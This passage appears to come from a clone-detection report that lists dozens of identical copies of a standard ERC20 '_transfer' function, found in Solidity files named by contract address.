        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="111" endline="123" pcid="1890">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="110" endline="122" pcid="2022">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="109" endline="121" pcid="3315">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="111" endline="123" pcid="2101">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="111" endline="123" pcid="7597">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="111" endline="123" pcid="196">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="112" endline="124" pcid="4748">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="107" endline="119" pcid="8788">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="106" endline="118" pcid="4291">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="104" endline="116" pcid="2726">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="108" endline="120" pcid="8840">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="108" endline="120" pcid="3780">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="110" endline="122" pcid="8803">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="107" endline="119" pcid="3890">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="112" endline="124" pcid="9135">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="111" endline="123" pcid="4651">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="110" endline="122" pcid="233">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="110" endline="122" pcid="1955">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="113" endline="125" pcid="1871">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="111" endline="123" pcid="3875">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="107" endline="119" pcid="9198">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="110" endline="122" pcid="6769">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="107" endline="119" pcid="6754">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="111" endline="123" pcid="4681">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="108" endline="120" pcid="670">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="111" endline="123" pcid="4438">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="109" endline="121" pcid="1935">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="110" endline="122" pcid="2190">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="727" endline="739" pcid="4098">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="109" endline="121" pcid="4497">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="111" endline="123" pcid="9150">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="112" endline="124" pcid="8728">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="109" endline="121" pcid="253">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="210" endline="222" pcid="6739">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="111" endline="123" pcid="4636">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="108" endline="120" pcid="1041">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="105" endline="117" pcid="4369">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="108" endline="120" pcid="6816">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="111" endline="123" pcid="1920">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="112" endline="124" pcid="6723">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="108" endline="120" pcid="8902">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="111" endline="123" pcid="4408">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="108" endline="120" pcid="7612">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="727" endline="739" pcid="6831">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="111" endline="123" pcid="8758">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="111" endline="123" pcid="4216">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="107" endline="119" pcid="3860">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="107" endline="119" pcid="3911">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="108" endline="120" pcid="4261">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="104" endline="116" pcid="7058">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="110" endline="122" pcid="4612">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="108" endline="120" pcid="3294">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="113" endline="125" pcid="87">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="105" endline="117" pcid="3733">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="112" endline="124" pcid="4246">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="113" endline="125" pcid="4482">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="122" endline="134" pcid="2156">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="108" endline="120" pcid="4393">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="113" endline="125" pcid="4597">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
